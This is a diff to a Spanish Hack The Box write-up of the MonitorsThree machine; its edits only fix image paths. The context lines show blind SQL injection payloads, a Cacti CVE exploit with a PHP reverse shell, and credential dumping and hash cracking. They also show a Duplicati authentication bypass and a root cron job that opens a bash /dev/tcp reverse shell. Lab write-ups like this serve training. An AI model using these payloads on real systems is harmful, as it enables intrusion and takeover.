@@ -86,19 +86,19 @@ http://monitorsthree.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@
 
 En este caso, la web inicial es sencilla y no ofrece muchas opciones visibles.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree1_1.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree1_1.png)
 
 El botón de `Login` redirige a un formulario de inicio de sesión.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree1_2.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree1_2.png)
 
 La página `forgot_password.php` expone un comportamiento interesante, permite detectar usuarios válidos debido a que responde de manera distinta cuando un usuario existe o no en el sistema.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree1_4.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree1_4.png)
 
 Logré identificar que el usuario `admin` es válido.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree1_3.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree1_3.png)
 
 Utilicé ffuf para descubrir subdominios adicionales.
 
@@ -106,7 +106,7 @@ Utilicé ffuf para descubrir subdominios adicionales.
 /home/kali/Documents/htb/machines/monitorsthree:-$ ffuf -u http://monitorsthree.htb/ -H "HOST:FUZZ.monitorsthree.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -t 200 -c
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree1_5.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree1_5.png)
 
 La herramienta arrojó múltiples resultados con un tamaño de respuesta de 13560 bytes, el mismo que el de la página principal.
 
@@ -121,7 +121,7 @@ Para filtrar las respuestas que no sean relevantes, ajusté el escaneo de ffuf p
 /home/kali/Documents/htb/machines/monitorsthree:-$ ffuf -u http://monitorsthree.htb/ -H "HOST:FUZZ.monitorsthree.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -t 200 -c -fs 13560
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree1_6.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree1_6.png)
 
 ```terminal
 /home/kali/Documents/htb/machines/monitorsthree:-$ sudo sed -i '$d' /etc/hosts
@@ -130,7 +130,7 @@ Para filtrar las respuestas que no sean relevantes, ajusté el escaneo de ffuf p
 
 En el subdominio encontrado, se muestra un formulario de inicio de sesión del servicio Cacti.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree1_7.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree1_7.png)
 
 ---
 ## Vulnerability Exploitation
@@ -142,13 +142,13 @@ En la página `forgot_password.php`, descubrí que el campo de entrada es vulner
 admin'--
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_1.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_1.png)
 
 ```sql
 admin'-- -
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_2.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_2.png)
 
 Aquí se presenta específicamente SQL Injection basada en respuestas condicionales.
 
@@ -160,7 +160,7 @@ La condición `1=1` siempre es verdadera. Si el usuario `admin` es válido, la a
 admin' AND '1'='1'-- -
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_3.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_3.png)
 
 Por otro lado, la condición `1=2` siempre es falsa. Aunque el usuario `admin` sea válido, la web responde con:
 * "Unable to process request, try again!".
@@ -170,7 +170,7 @@ Por otro lado, la condición `1=2` siempre es falsa. Aunque el usuario `admin` s
 admin' AND '1'='2'-- -
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_4.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_4.png)
 
 Al inyectar la siguiente condición, introduje una subconsulta que intenta recuperar un valor específico de la tabla `users`. 
 
@@ -183,7 +183,7 @@ Respuesta de la web
 admin' AND (SELECT 'a' FROM users WHERE username='admin')='a'-- -
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_5.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_5.png)
 
 En lugar de verificar la existencia de un usuario, introduzco deliberadamente un valor diferente al esperado para forzar un error en la comparación.
 
@@ -196,7 +196,7 @@ Respuesta de la web
 admin' AND (SELECT 'a' FROM users WHERE username='admin')='b'-- -
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_6.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_6.png)
 
 De forma similar a la validación del usuario, es posible determinar la longitud de la contraseña del usuario `admin` mediante inyecciones condicionales. La idea es comparar la longitud de la contraseña almacenada en la base de datos con diferentes valores y observar cómo responde la web.
 
@@ -207,7 +207,7 @@ Respuesta de la web
 admin' AND (SELECT 'a' FROM users WHERE username='admin' AND CHAR_LENGTH(password)>=32)='a'-- -
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_7.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_7.png)
 
 Respuesta de la web
 * "Content-Length: `3380`".
@@ -216,7 +216,7 @@ Respuesta de la web
 admin' AND (SELECT 'a' FROM users WHERE username='admin' AND CHAR_LENGTH(password)>=33)='a'-- -
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_8.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_8.png)
 
 Con el usuario admin identificado y la longitud de su contraseña determinada, el siguiente paso es extraer la contraseña carácter por carácter.
 
@@ -226,12 +226,12 @@ La función `SUBSTRING()` permite obtener un carácter específico de una cadena
 admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_9.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_10.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_9.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_10.png)
 
 Identificamos que el primer carácter de la contraseña del usuario admin es un "3", ya que es el único payload que produce una respuesta con un Length diferente.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_11.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_11.png)
 
 Para revelar el resto de la contraseña, aplico el mismo método usado previamente, pero modificando el índice en la función `SUBSTRING()` para obtener cada carácter de forma secuencial.
 
@@ -258,13 +258,13 @@ El hash extraído corresponde al algoritmo MD5.
 
 <https://crackstation.net/>
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree2_12.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree2_12.png)
 
 ---
 ## Foothold
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree3_1.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree3_2.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree3_1.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree3_2.png)
 
 Una vez autenticado en Cacti, noto que la versión utilizada es 1.2.26, la cual es vulnerable a [CVE-2024-25641](https://nvd.nist.gov/vuln/detail/CVE-2024-25641).
 
@@ -279,7 +279,7 @@ Para explotar esta vulnerabilidad, utilicé el siguiente [exploit](https://githu
 /home/kali/Documents/htb/machines/monitorsthree:-$ python3 exploit.py http://cacti.monitorsthree.htb/cacti/ admin greencacti2001 -p /home/kali/Documents/tools/php-reverse-shell.php
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree3_3.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree3_3.png)
 
 ```terminal
 	... connect to [10.10.16.84] from (UNKNOWN) [10.10.11.30] 43266
@@ -322,7 +322,7 @@ Encuentro credenciales para una base de datos MySQL.
 www-data@monitorsthree:/$ cat /var/www/html/app/admin/db.php
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree4_0.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree4_0.png)
 
 El puerto 3306 está activo en el sistema, lo que confirma que el servicio MySQL está funcionando.
 
@@ -330,7 +330,7 @@ El puerto 3306 está activo en el sistema, lo que confirma que el servicio MySQL
 www-data@monitorsthree:/$ ss -tulnp
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree4_1.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree4_1.png)
 
 Confirmo la presencia de las credenciales utilizadas por los usuarios de la aplicación Cacti, incluyendo el hash previamente dumpeado por SQLi.
 
@@ -343,7 +343,7 @@ MariaDB [(none)]> USE monitorsthree_db;
 MariaDB [(monitorsthree_db)]> select * from users;
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree4_2.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree4_2.png)
 
 Encontré credenciales adicionales para el servicio MySQL en el archivo `/html/cacti/include/config.php`.
 
@@ -351,7 +351,7 @@ Encontré credenciales adicionales para el servicio MySQL en el archivo `/html/c
 www-data@monitorsthree:~/html/cacti/include$ cat config.php
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree4_3.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree4_3.png)
 
 Utilizando las nuevas credenciales, accedo a la base de datos Cacti. Dentro encuentro una tabla de usuarios con hashes de contraseñas.
 
@@ -364,7 +364,7 @@ MariaDB [(none)]> USE cacti;
 MariaDB [(cacti)]> select * from user_auth;
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree4_4.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree4_4.png)
 
 
 ```terminal
@@ -373,7 +373,7 @@ MariaDB [(cacti)]> select * from user_auth;
 /home/kali/Documents/htb/machines/monitorsthree:-$ hashcat --show hash.txt
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree4_5.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree4_5.png)
 
 ```terminal
 /home/kali/Documents/htb/machines/monitorsthree:-$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
@@ -444,7 +444,7 @@ marcus@monitorsthree:~$ cat user.txt
 marcus@monitorsthree:~$ ss -tulnp
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree5_1.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree5_1.png)
 
 ```terminal
 /home/kali/Documents/htb/machines/monitorsthree:-$ ssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -i id_rsa -N -f
@@ -452,7 +452,7 @@ marcus@monitorsthree:~$ ss -tulnp
 
 Al acceder al puerto redirigido confirmo que el servicio en ejecución es Duplicati.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree5_2.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree5_2.png)
 
 El servicio Duplicati presenta una vulnerabilidad que permite eludir la autenticación de inicio de sesión utilizando el Server Passphrase.
 
@@ -464,7 +464,7 @@ El servicio Duplicati presenta una vulnerabilidad que permite eludir la autentic
 marcus@monitorsthree:~$ find / -name '*duplicati*' 2>/dev/null
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree5_3.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree5_3.png)
 
 ```terminal
 marcus@monitorsthree:~$ ls -al /opt/duplicati/config/
@@ -486,8 +486,8 @@ Abro la base de datos utilizando sqlitebrowser para extraer el `Server_passphras
 /home/kali/Documents/htb/machines/monitorsthree:-$ sqlitebrowser Duplicati-server.sqlite
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree5_4.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree5_5.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree5_4.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree5_5.png)
 
 Decodifico el passphrase y convierto el resultado en hexadecimal.
 
@@ -498,17 +498,17 @@ echo 'Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=' | base64 -d | xxd -p -c 256
 
 Intercepto una solicitud de inicio de sesión fallido con Burp Suite.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree6_0.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree6_0.png)
 
 Configuro el interceptor en "Do Intercept > Response to this request". Y la doy a Foward.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree6_1.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree6_1.png)
 
 Extraigo los valores de interés del response interceptado.
 * Nonce: ```"Nonce": "LXvXjDAJVXgBezoVXcXW+psVClH8j15IbkSn4FWnJ18="```
 * Salt: (Debe coincidir con el valor de `server-passphrase-salt` en `Duplicati-server.sqlite`).
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree6_2.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree6_2.png)
 
 
 Utilizo el Nonce y el Server-passphrase decodificado para generar un token de autenticación válido.
@@ -521,7 +521,7 @@ var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse
 console.log(noncedpwd);
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree6_3.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree6_3.png)
 
 El script genera un token de autenticación válido basado en la combinación del Nonce y el Server-passphrase.
 
@@ -531,15 +531,15 @@ SOZ7kd2Q6gC7XdffvKuB27Bgw9N/ayYRCnR/bHrEkYE=
 
 En Burp Suite, reenvío la solicitud interceptada al servidor hasta encontrar el parámetro `password`.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree6_4.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree6_4.png)
 
 Modifico el parámetro `password` de la solicitud  y lo reemplazo por el token generado (noncedpwd). Es necesario URL encodear el token antes de enviarlo para garantizar que sea interpretado correctamente por el servidor.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree6_5.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree6_5.png)
 
 Después de modificar y reenviar la solicitud, observo que se ha completado el inicio de sesión en la interfaz web de Duplicati sin necesidad de la contraseña original.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_1.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_1.png)
 
 Procedo a crear un archivo de cron que ejecutará una reverse shell con permisos de root. Este archivo se guarda en el directorio personal de Marcus y se utiliza Duplicati para crear un respaldo de este archivo y restaurarlo como una tarea de cron. Esto resulta en la ejecución del comando como root, lo que conduce a una ejecución remota de comandos.
 
@@ -549,25 +549,25 @@ marcus@monitorsthree:~$ echo '* * * * * root /bin/bash -c "/bin/bash -i >& /dev/
 
 Este archivo está configurado para ejecutarse cada minuto con permisos de root.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_2.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_3.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_4.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_5.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_6.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_7.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_2.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_3.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_4.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_5.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_6.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_7.png)
 
 ```terminal
 /home/kali/Documents/htb/machines/monitorsthree:-$ nc -nvlp 4321
 	listening on [any] 4321 ...
 ```
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_8.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_8.png)
 
 Utilizo la función de restaurar de Duplicati, especificando que los archivos se restauren en el directorio `/etc/cron.d`, donde los archivos de cron son reconocidos y ejecutados automáticamente.
 
-![](assets/img/htb-writeup-monitorsthree/monitorsthree7_9.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree8_1.png)
-![](assets/img/htb-writeup-monitorsthree/monitorsthree8_2.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree7_9.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree8_1.png)
+![](/assets/img/htb-writeup-monitorsthree/monitorsthree8_2.png)
 
 Verifico en mi listener de Netcat y confirmo que se ha recibido una conexión como el usuario root.
 
